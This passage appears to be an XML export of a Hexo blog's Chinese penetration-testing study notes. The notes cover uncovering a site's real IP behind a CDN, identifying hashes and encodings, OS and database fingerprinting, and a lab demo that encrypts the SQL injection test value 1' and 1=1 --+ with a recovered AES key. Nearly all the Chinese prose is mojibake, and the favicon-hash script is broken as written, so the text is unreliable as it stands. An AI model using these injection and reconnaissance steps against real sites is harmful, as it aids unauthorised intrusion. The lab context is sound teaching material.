å­åŸŸåå°æŠ€å·§/é‡‡é›†/å›½å¤–è¯·æ±‚ï¼ˆåŒç±»å‹è®¿é—®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m.sp910</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211051854.png" alt="image-20210921105150785"></p><h4 id="åˆ©ç”¨é‚®ä»¶æœåŠ¡å™¨æ¥å£è·å–çœŸå®IP"><a href="#åˆ©ç”¨é‚®ä»¶æœåŠ¡å™¨æ¥å£è·å–çœŸå®IP" class="headerlink" title="åˆ©ç”¨é‚®ä»¶æœåŠ¡å™¨æ¥å£è·å–çœŸå®IP"></a>åˆ©ç”¨é‚®ä»¶æœåŠ¡å™¨æ¥å£è·å–çœŸå®IP</h4><p>mozhe é‚®ç®±æºç æµ‹è¯•å¯¹æ¯”ç¬¬ä¸‰æ–¹æŸ¥è¯¢ï¼ˆåœ°åŒºåˆ†æï¼‰</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211048255.png" alt="image-20210819151810127"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211052617.png" alt="image-20210921105201554"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211052227.png" alt="image-20210921105213138"></p><p>æ ¹æ®ipæŸ¥åœ°å€ä¿¡æ¯åˆ¤æ–­å“ªä¸ªæ˜¯çœŸå®ip</p><p>æˆ–è€…ä¿®æ”¹ç»‘å®šhostæ–‡ä»¶ä¸ºçœŸå®ipï¼Œçœ‹èƒ½å¦è®¿é—®</p><h4 id="åˆ©ç”¨é»‘æš—å¼•æ“æœç´¢ç‰¹å®šæ–‡ä»¶è·å–çœŸå®IP"><a href="#åˆ©ç”¨é»‘æš—å¼•æ“æœç´¢ç‰¹å®šæ–‡ä»¶è·å–çœŸå®IP" class="headerlink" title="åˆ©ç”¨é»‘æš—å¼•æ“æœç´¢ç‰¹å®šæ–‡ä»¶è·å–çœŸå®IP"></a>åˆ©ç”¨é»‘æš—å¼•æ“æœç´¢ç‰¹å®šæ–‡ä»¶è·å–çœŸå®IP</h4><p>103.75.182.15:2087é»‘æš—å¼•æ“ï¼ˆshodanæœæŒ‡å®šhashæ–‡ä»¶ï¼‰</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211048400.png" alt="image-20210819154706132"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211048422.png" alt="image-20210819161013304"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> mmh3</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">response=requests.get(<span class="string">&#x27;favicon.ico&#x27;</span>)</span><br><span class="line">favicon=response.content.encode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line"><span class="built_in">hash</span>=mmh3.<span class="built_in">hash</span>(favicon)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;http.favicon.hash:&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hash</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211048784.png" alt="image-20210819161027327"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211048876.png" alt="image-20210819161040393"></p><h3 id="æ¶‰åŠèµ„æºï¼š"><a href="#æ¶‰åŠèµ„æºï¼š" class="headerlink" title="æ¶‰åŠèµ„æºï¼š"></a>æ¶‰åŠèµ„æºï¼š</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">https://www.shodan.io</span><br><span class="line">https://x.threatbook.cn</span><br><span class="line">http://ping.chinaz.com</span><br><span class="line">https://www.get-site-ip.com/</span><br><span class="line">https://asm.ca.com/en/ping.php</span><br><span class="line">https://github.com/Tai7sy/fuckcdn</span><br><span class="line">https://github.com/boy-hack/w8fuckcdn</span><br><span class="line">https://mp.weixin.qq.com/s?__biz=MzA5MzQ3MDE1NQ==&amp;mid=2653939118&amp;id</span><br><span class="line">x=1&amp;sn=945b81344d9c89431a8c413ff633fc3a&amp;chksm=8b86290abcf1a01cdc0071</span><br><span class="line">1339884602b5bb474111d3aff2d465182702715087e22c852c158f&amp;token=2684171</span><br><span class="line">43&amp;lang=zh_CN#rd</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> ä¿¡æ¯æ”¶é›† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>06åŸºç¡€å…¥é—¨--åŠ å¯†ç¼–ç ç®—æ³•</title>
      <link href="/2021/09/21/06%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/"/>
      <url>/2021/09/21/06%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†</p><span id="more"></span><h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼Œå¸¸è§çš„å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯ä¼šé‡‡ç”¨åŠ å¯†å¤„ç†ï¼Œå…¶ä¸­ä½œä¸ºå®‰å…¨æµ‹è¯•äººå‘˜å¿…é¡»è¦äº†è§£å¸¸è§çš„åŠ å¯†æ–¹å¼ï¼Œæ‰èƒ½ä¸ºåç»­çš„å®‰å…¨æµ‹è¯•åšå¥½å‡†å¤‡ï¼Œæœ¬æ¬¡è¯¾ç¨‹å°†è®²è§£å„ç§åŠ å¯†ç¼–ç ç­‰çŸ¥è¯†ï¼Œä¾¿äºåæœŸçš„å­¦ä¹ å’Œå‘å±•ã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211046610.png" alt="image-20210921104602551"></p><h3 id="å¸¸è§åŠ å¯†ç¼–ç ç­‰ç®—æ³•è§£æ"><a href="#å¸¸è§åŠ å¯†ç¼–ç ç­‰ç®—æ³•è§£æ" class="headerlink" title="å¸¸è§åŠ å¯†ç¼–ç ç­‰ç®—æ³•è§£æ"></a>å¸¸è§åŠ å¯†ç¼–ç ç­‰ç®—æ³•è§£æ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MD5ï¼ŒSHAï¼ŒASCï¼Œè¿›åˆ¶ï¼Œæ—¶é—´æˆ³ï¼ŒURLï¼ŒBASE64ï¼ŒUnescapeï¼ŒAESï¼ŒDES ç­‰</span><br></pre></td></tr></table></figure><h4 id="MD5-ä¸å¯é€†"><a href="#MD5-ä¸å¯é€†" class="headerlink" title="MD5(ä¸å¯é€†)"></a>MD5(ä¸å¯é€†)</h4><p>åˆ†ä¸º16ä½å’Œ32ä½ï¼Œå¾ˆå¤šç½‘ç«™ç®¡ç†å‘˜çš„å¯†ç éƒ½ä¼šé‡‡ç”¨md5åŠ å¯†ã€‚</p><p>ç‰¹ç‚¹ï¼š32ä½æ•°å­—å­—æ¯ï¼ˆa-fï¼‰æ··åˆï¼Œä¸å¯é€†</p><p>è§£å¯†å¹³å°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://cmd5.com/</span><br><span class="line">somd5.com/</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211046973.png" alt="image-20210921104609914"></p><h4 id="SHA"><a href="#SHA" class="headerlink" title="SHA"></a>SHA</h4><p>ç‰¹ç‚¹ï¼š40ä½æ•°å­—å­—æ¯ï¼ˆa-fï¼‰æ··åˆï¼Œä¸å¯é€†</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211046306.png" alt="image-20210921104616246"></p><h4 id="SHA256-384-512"><a href="#SHA256-384-512" class="headerlink" title="SHA256/384/512"></a>SHA256/384/512</h4><p>ç‰¹ç‚¹ï¼šå›ºå®šä½æ•°æ•°å­—å­—æ¯ï¼ˆa-fï¼‰æ··åˆï¼Œä¸å¯é€†</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211046695.png" alt="image-20210921104626610" style="zoom:80%;" /><h4 id="è¿›åˆ¶"><a href="#è¿›åˆ¶" class="headerlink" title="è¿›åˆ¶"></a>è¿›åˆ¶</h4><p>è¿›åˆ¶ç¼–ç </p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211046508.png" alt="image-20210921104637429" style="zoom:67%;" /><h4 id="æ—¶é—´æˆ³"><a href="#æ—¶é—´æˆ³" class="headerlink" title="æ—¶é—´æˆ³"></a>æ—¶é—´æˆ³</h4><p>ç½‘ç«™æˆ–è€…æœåŠ¡å™¨è„šæœ¬è¯­è¨€é‡Œç»å¸¸ä¼šä½¿ç”¨ï¼Œä¼šåœ¨æ•°æ®åº“é‡Œç”¨æˆ·ç™»å½•å’Œæ³¨é”€ï¼Œæ³¨å†Œé‡Œä¼šä½¿ç”¨</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211045588.png" alt="image-20210818151856485"></p><h4 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h4><p>æµè§ˆå™¨ä¹Ÿä¼šè¿›è¡ŒåŠ å¯†</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211046483.png" alt="image-20210921104649410"></p><h4 id="BASE64"><a href="#BASE64" class="headerlink" title="BASE64"></a>BASE64</h4><p>è§„å¾‹ï¼šæ˜æ–‡è¶Šé•¿ï¼Œå¯†æ–‡è¶Šé•¿</p><p>ç‰¹ç‚¹ï¼šåŒºåˆ†å¤§å°å†™ï¼Œå¤§å†™å­—æ¯å°å†™å­—æ¯æ•°å­—çš„ç»„åˆã€‚æœ«å°¾æœ‰ä¸€ä¸ªæˆ–ä¸¤ä¸ª==</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211047241.png" alt="image-20210921104700148"></p><h4 id="unescape"><a href="#unescape" class="headerlink" title="unescape"></a>unescape</h4><p>ç‰¹ç‚¹ï¼š%u+4ä½æ•°å­—ï¼Œå¯¹åº”ä¸¤ä½å­—ç¬¦ï¼Œå•æ•°çš„æ—¶å€™æœ€åä¸€ä¸ª%00ï¼ŒåŒæ•°çš„æ—¶å€™æœ€åä¸€ä¸ª%0000</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211045604.png" alt="image-20210818155452475"></p><h4 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h4><p>æ˜¯ä¸€ç§å®‰å…¨çš„åŠ å¯†æ–¹å¼ï¼Œæ¶‰åŠåˆ°å¯†ç ï¼Œåç§»é‡ï¼Œæ•°æ®å—ï¼Œå¡«å……ï¼Œåœ¨åŠ å¯†æ—¶å€™æ¶‰åŠåˆ°4ç§éšæœºæ€§ã€‚è§£å¯†éš¾åº¦å¤§ã€‚ç”¨base64è§£å¯†å‡ºæ¥æ˜¯ä¹±ç ï¼Œæœ‰å¾ˆå¤§å¯èƒ½æ˜¯AESåŠ å¯†ã€‚æœ‰æ—¶å€™/å‡ºç°åœ¨å­—ç¬¦ä¸²é‡Œé¢ã€‚æ¯”è¾ƒæ³¨é‡å®‰å…¨å’Œå¤§å‹ç½‘ç«™ã€å®‰å…¨æ¯”èµ›<br>æ³¨ï¼šå¿…é¡»æœ‰å¯†ç å’Œåç§»é‡ï¼Œå¦åˆ™æ— æ³•è¿›è¡Œè§£å¯†</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211047004.png" alt="image-20210921104710930"></p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211047469.png" alt="image-20210921104725407" style="zoom:67%;" /><h4 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h4><p>ç‰¹ç‚¹ï¼š</p><p>æ˜æ–‡è¶Šé•¿ï¼Œå¯†æ–‡ä¹Ÿè¶Šé•¿ï¼Œå¯è‡ªå®šä¹‰å¯†ç ï¼Œè¾“å‡ºæœ‰æ—¶å€™å¸¦â€™+â€™</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211047887.png" alt="image-20210921104733815"></p><h3 id="å¸¸è§åŠ å¯†å½¢å¼ç®—æ³•è§£æ"><a href="#å¸¸è§åŠ å¯†å½¢å¼ç®—æ³•è§£æ" class="headerlink" title="å¸¸è§åŠ å¯†å½¢å¼ç®—æ³•è§£æ"></a>å¸¸è§åŠ å¯†å½¢å¼ç®—æ³•è§£æ</h3><p>ç›´æ¥åŠ å¯†ï¼Œå¸¦ saltï¼Œå¸¦å¯†ç ï¼Œå¸¦åç§»ï¼Œå¸¦ä½æ•°ï¼Œå¸¦æ¨¡å¼ï¼Œå¸¦å¹²æ‰°ï¼Œè‡ªå®šä¹‰ç»„åˆç­‰</p><h3 id="å¸¸è§è§£å¯†æ–¹å¼ï¼ˆé’ˆå¯¹ï¼‰"><a href="#å¸¸è§è§£å¯†æ–¹å¼ï¼ˆé’ˆå¯¹ï¼‰" class="headerlink" title="å¸¸è§è§£å¯†æ–¹å¼ï¼ˆé’ˆå¯¹ï¼‰"></a>å¸¸è§è§£å¯†æ–¹å¼ï¼ˆé’ˆå¯¹ï¼‰</h3><p>æšä¸¾ï¼Œè‡ªå®šä¹‰é€†å‘ç®—æ³•ï¼Œå¯é€†å‘</p><h3 id="äº†è§£å¸¸è§„åŠ å¯†ç®—æ³•çš„ç‰¹æ€§"><a href="#äº†è§£å¸¸è§„åŠ å¯†ç®—æ³•çš„ç‰¹æ€§" class="headerlink" title="äº†è§£å¸¸è§„åŠ å¯†ç®—æ³•çš„ç‰¹æ€§"></a>äº†è§£å¸¸è§„åŠ å¯†ç®—æ³•çš„ç‰¹æ€§</h3><p>é•¿åº¦ä½æ•°ï¼Œå­—ç¬¦è§„å¾‹ï¼Œä»£ç åˆ†æï¼Œæœç´¢è·å–ç­‰</p><h3 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://www.jsons.cn/desencrypt/</span><br><span class="line">https://www.cmd5.com/</span><br><span class="line">https://tool.lu/timestamp/</span><br><span class="line">http://tool.chacuo.net/cryptaes</span><br><span class="line">http://tools.jb51.net/password/des_encode</span><br><span class="line">http://encode.chahuo.com/</span><br></pre></td></tr></table></figure><h3 id="æ¼”ç¤ºæ¡ˆä¾‹"><a href="#æ¼”ç¤ºæ¡ˆä¾‹" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹"></a>æ¼”ç¤ºæ¡ˆä¾‹</h3><h4 id="SQLæ³¨å…¥æ¼æ´æµ‹è¯•-å‚æ•°åŠ å¯†"><a href="#SQLæ³¨å…¥æ¼æ´æµ‹è¯•-å‚æ•°åŠ å¯†" class="headerlink" title="SQLæ³¨å…¥æ¼æ´æµ‹è¯•(å‚æ•°åŠ å¯†)"></a>SQLæ³¨å…¥æ¼æ´æµ‹è¯•(å‚æ•°åŠ å¯†)</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211047499.png" alt="image-20210921104742440"></p><p>å¯ä»¥çœ‹åˆ°idåé¢çš„å‚æ•°æ˜¯ç»è¿‡åŠ å¯†çš„ã€‚</p><p>å¾¡å‰‘æ‰«ä¸€ä¸‹åå°</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211047043.png" alt="image-20210921104749964"></p><p>å‘ç°æœ‰ä¿©ä¸ªæ–‡ä»¶</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211045320.png" alt="image-20210818162005675"></p><p>phpæ–‡ä»¶æ˜¯ä¸€ä¸ªè§£å¯†çš„è„šæœ¬ï¼Œçœ‹æ¥è¿™ä¸ªå°±æ˜¯è§£å¯†è„šæœ¬ã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211045340.png" alt="image-20210818162553590"></p><p>å› ä¸ºæœ‰ä¿©æ¬¡base64åŠ å¯†ï¼Œæ‰€æœ‰éœ€è¦å…ˆè§£å¯†ä¸€æ¬¡</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211048516.png" alt="image-20210921104801432"></p><p>å†æ¬¡è§£å¯†ï¼Œé€šè¿‡ä¸Šé¢è§£å¯†è„šæœ¬å°±å¯ä»¥çœ‹å‡ºæ˜¯AESåŠ å¯†ï¼Œæ‰€ä»¥ç›´æ¥åˆ°AESä¸­è¿›è¡Œè§£å¯†ã€‚<br>AESåŠ å¯†æ¨¡å¼ï¼šCBCã€æ•°æ®å—ï¼š128ä½ã€å¯†ç ï¼šydhaqPQnexoaDuW3ã€åç§»é‡ï¼š2018201920202021<br>è§£å¯†å¾—å‡ºï¼š1_mozhe</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211045759.png" alt="image-20210818163746242"></p><p>ä¹‹åå¯ä»¥çœ‹åˆ°å°†_mozheåˆ é™¤å°±æ˜¯1ï¼Œæ‰€æœ‰å‚æ•°å°±æ˜¯1</p><p>ä¹‹åæˆ‘ä»¬é€šè¿‡è¿™æ ·çš„åŠ å¯†æ¨¡å¼å°±å¯ä»¥å†™å…¥æˆ‘ä»¬çš„å‚æ•°äº†ã€‚</p><p>è¿™é‡Œæˆ‘ä»¥1â€™ and 1=1 â€“+ä¸ºä¾‹</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211048950.png" alt="image-20210921104811874"></p><p>å†æ¬¡è¿›è¡Œbase64åŠ å¯†</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211048272.png" alt="image-20210921104819197"></p><p>æœ€åç»“æœ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MHk4MWZ6TjArWlVSQ1hHVkUrZVdPdz09</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> åŸºç¡€å…¥é—¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>05åŸºç¡€å…¥é—¨--ç³»ç»ŸåŠæ•°æ®åº“</title>
      <link href="/2021/09/21/05%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E7%B3%BB%E7%BB%9F%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>/2021/09/21/05%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E7%B3%BB%E7%BB%9F%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<p>ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†</p><span id="more"></span><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>é™¤å»å‰æœŸçš„æ­å»ºå¹³å°ä¸­é—´ä»¶ï¼Œç½‘ç«™æºç ç­‰ï¼Œå®¹æ˜“å—åˆ°æ”»å‡»çš„è¿˜æœ‰æ“ä½œç³»ç»Ÿæ•°æ®åº“ï¼Œç¬¬ä¸‰æ–¹è½¯ä»¶å¹³å°ç­‰ã€‚å…¶ä¸­æ­¤ç±»æ”»å‡»ä¹Ÿèƒ½ç›´æ¥å½±å“åˆ°WEBæˆ–æœåŠ¡å™¨çš„å®‰å…¨ï¼Œå¯¼è‡´ç½‘ç«™æˆ–æœåŠ¡å™¨æƒé™çš„è·å–ã€‚</p><p>é™¤å»å¸¸è§„WEBå±‚é¢ä»¥åŠAPPå®‰å…¨å¤–ï¼Œç±»ä¼¼æœåŠ¡å™¨å•ä¸€æˆ–è€…å¤æ‚çš„å…¶ä»–æœåŠ¡ï¼Œæ¸¸æˆï¼Œè´Ÿè½½å‡è¡¡ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºå®‰å…¨æµ‹è¯•ç›®æ ‡ï¼Œæ­¤ç±»ç›®æ ‡æµ‹è¯•åŸåˆ™åªæ˜¯ä¸ºäº†WEBåº”ç”¨æˆ–è€…å…¶ä»–å®‰å…¨é—®é¢˜ã€‚</p><h3 id="æ“ä½œç³»ç»Ÿå±‚é¢"><a href="#æ“ä½œç³»ç»Ÿå±‚é¢" class="headerlink" title="æ“ä½œç³»ç»Ÿå±‚é¢"></a>æ“ä½œç³»ç»Ÿå±‚é¢</h3><h4 id="è¯†åˆ«æ“ä½œç³»ç»Ÿå¸¸è§æ–¹æ³•"><a href="#è¯†åˆ«æ“ä½œç³»ç»Ÿå¸¸è§æ–¹æ³•" class="headerlink" title="è¯†åˆ«æ“ä½œç³»ç»Ÿå¸¸è§æ–¹æ³•"></a>è¯†åˆ«æ“ä½œç³»ç»Ÿå¸¸è§æ–¹æ³•</h4><p>windowså¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼Œæ— è®ºå¤§å°å†™éƒ½æ˜¯ä¸€æ ·çš„ï¼Œè€Œlinuxå¯¹å¤§å°å†™æ•æ„Ÿã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211044056.png" alt="image-20210921104432990"></p><p>è¿™ä¸ªç½‘ç«™æ˜¯windowsçš„</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211044922.png" alt="image-20210921104444650"></p><p>è¿™ä¸ªç½‘ç«™å°±æ˜¯linuxçš„</p><p>åˆ©ç”¨TTLæ¥è¿›è¡Œç½‘ç«™æ“ä½œç³»ç»Ÿè¯†åˆ«ï¼Œè¿™ä¸ªä¸å¤ªå‡†ç¡®</p><p>ä¸åŒçš„æ“ä½œç³»ç»Ÿçš„é»˜è®¤TTLå€¼æ˜¯ä¸åŒçš„ï¼Œ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡TTLå€¼æ¥åˆ¤æ–­ä¸»æœºçš„æ“ä½œç³»ç»Ÿï¼Œä½†æ˜¯å½“ç”¨æˆ·ä¿®æ”¹äº†TTLå€¼çš„æ—¶å€™ï¼Œå°±ä¼šè¯¯å¯¼æˆ‘ä»¬çš„åˆ¤æ–­ï¼Œæ‰€ä»¥è¿™ç§åˆ¤æ–­æ–¹å¼ä¹Ÿä¸ä¸€å®šå‡†ç¡®ã€‚ä¸‹é¢æ˜¯é»˜è®¤æ“ä½œç³»ç»Ÿçš„TTLï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1ã€WINDOWS NT/2000  TTLï¼š128</span><br><span class="line">2ã€WINDOWS 95/98   TTLï¼š32</span><br><span class="line">3ã€UNIX        TTLï¼š255</span><br><span class="line">4ã€LINUX       TTLï¼š64</span><br><span class="line">5ã€WIN7      TTLï¼š64</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨nmapè¿›è¡Œè¯†åˆ«</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O ipåœ°å€</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211044467.png" alt="image-20210921104453346"></p><h4 id="ç®€è¿°ä¸¤è€…åŒºåˆ«ä»¥åŠè¯†åˆ«çš„æ„ä¹‰"><a href="#ç®€è¿°ä¸¤è€…åŒºåˆ«ä»¥åŠè¯†åˆ«çš„æ„ä¹‰" class="headerlink" title="ç®€è¿°ä¸¤è€…åŒºåˆ«ä»¥åŠè¯†åˆ«çš„æ„ä¹‰"></a>ç®€è¿°ä¸¤è€…åŒºåˆ«ä»¥åŠè¯†åˆ«çš„æ„ä¹‰</h4><p>1.ç½‘ç«™è·¯å¾„åŒºåˆ«</p><p>2.å¤§å°å†™åŒºåˆ«</p><p>3.æ–‡ä»¶åœ¨linuxå’Œwindowsçš„é€‚ç”¨æ€§</p><p>é€šè¿‡åˆ¤æ–­æ“ä½œç³»ç»Ÿï¼Œä»åˆé€‚ä»–çš„æ¼æ´è¿›è¡Œåˆ©ç”¨</p><h4 id="æ“ä½œç³»ç»Ÿå±‚é¢æ¼æ´ç±»å‹å¯¹åº”æ„ä¹‰"><a href="#æ“ä½œç³»ç»Ÿå±‚é¢æ¼æ´ç±»å‹å¯¹åº”æ„ä¹‰" class="headerlink" title="æ“ä½œç³»ç»Ÿå±‚é¢æ¼æ´ç±»å‹å¯¹åº”æ„ä¹‰"></a>æ“ä½œç³»ç»Ÿå±‚é¢æ¼æ´ç±»å‹å¯¹åº”æ„ä¹‰</h4><p>æ°¸ç—•ä¹‹è“</p><p>å¯èƒ½ä¼šé€ æˆè®¡ç®—æœºå´©æºƒï¼Œè·å–åˆ°å¯¹åº”shellã€‚</p><h4 id="ç®€è¦æ“ä½œç³»ç»Ÿå±‚é¢æ¼æ´å½±å“èŒƒå›´"><a href="#ç®€è¦æ“ä½œç³»ç»Ÿå±‚é¢æ¼æ´å½±å“èŒƒå›´" class="headerlink" title="ç®€è¦æ“ä½œç³»ç»Ÿå±‚é¢æ¼æ´å½±å“èŒƒå›´"></a>ç®€è¦æ“ä½œç³»ç»Ÿå±‚é¢æ¼æ´å½±å“èŒƒå›´</h4><p>è·å–ç›¸åº”æƒé™ï¼ŒæŸäº›æœåŠ¡å´©æºƒï¼Œè®¡ç®—æœºå´©æºƒ</p><h3 id="æ•°æ®åº“å±‚é¢"><a href="#æ•°æ®åº“å±‚é¢" class="headerlink" title="æ•°æ®åº“å±‚é¢"></a>æ•°æ®åº“å±‚é¢</h3><p>é™æ€ç½‘ç«™æ˜¯æ²¡æœ‰æ¼æ´çš„ï¼ŒåŠ¨æ€ç½‘ç«™æ‰æœ‰æ¼æ´</p><h4 id="è¯†åˆ«æ•°æ®åº“ç±»å‹å¸¸è§æ–¹æ³•"><a href="#è¯†åˆ«æ•°æ®åº“ç±»å‹å¸¸è§æ–¹æ³•" class="headerlink" title="è¯†åˆ«æ•°æ®åº“ç±»å‹å¸¸è§æ–¹æ³•"></a>è¯†åˆ«æ•°æ®åº“ç±»å‹å¸¸è§æ–¹æ³•</h4><ul><li>å°å‹æ•°æ®åº“ Access</li><li>ä¸­å‹æ•°æ®åº“ MySQL</li><li>å¤§å‹æ•°æ®åº“ Oracleã€SQL Server</li></ul><p>1.é€šè¿‡ç½‘ç«™è¯†åˆ«æ•°æ®åº“</p><p>å¸¸è§æ­å»ºç»„åˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ASP+Accessï¼Œsql server ï¼ˆwindowsï¼‰</span><br><span class="line">PHP+Mysqlï¼ˆlinuxã€windowsï¼‰ ç«¯å£ï¼š3306</span><br><span class="line">ASPX+Mssql(windows) ç«¯å£ï¼š1433</span><br><span class="line">Jsp+Mssqlï¼ˆwindowsï¼‰,oracle ï¼ˆlinuxã€windowsï¼‰ç«¯å£ï¼š1521</span><br><span class="line">Python+Mongodb ï¼ˆlinuxã€windowsï¼‰</span><br></pre></td></tr></table></figure><p> 2.åˆ©ç”¨ç«¯å£æ‰«æè¯†åˆ«æ•°æ®åº“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Oracle 1521</span><br><span class="line">MySql 3306</span><br><span class="line">SQLServer 1433</span><br><span class="line">MongoDB 27017</span><br><span class="line">Redis 6379</span><br><span class="line">memcached 11211</span><br><span class="line">psotgreSQL 5432</span><br><span class="line">db2 5000</span><br><span class="line">Derby 1521</span><br><span class="line">pgsql 5432</span><br><span class="line">ponitbase 9092</span><br></pre></td></tr></table></figure><h4 id="æ•°æ®åº“ç±»å‹åŒºåˆ«åŠè¯†åˆ«æ„ä¹‰"><a href="#æ•°æ®åº“ç±»å‹åŒºåˆ«åŠè¯†åˆ«æ„ä¹‰" class="headerlink" title="æ•°æ®åº“ç±»å‹åŒºåˆ«åŠè¯†åˆ«æ„ä¹‰"></a>æ•°æ®åº“ç±»å‹åŒºåˆ«åŠè¯†åˆ«æ„ä¹‰</h4><p>æ•°æ®åº“ä¸åŒï¼Œç»“æ„ä¹Ÿä¸åŒã€‚äº§ç”Ÿçš„æ¼æ´ä¹Ÿä¸åŒï¼Œæ”»å‡»æ‰‹æ³•ä¹Ÿä¸åŒ</p><h4 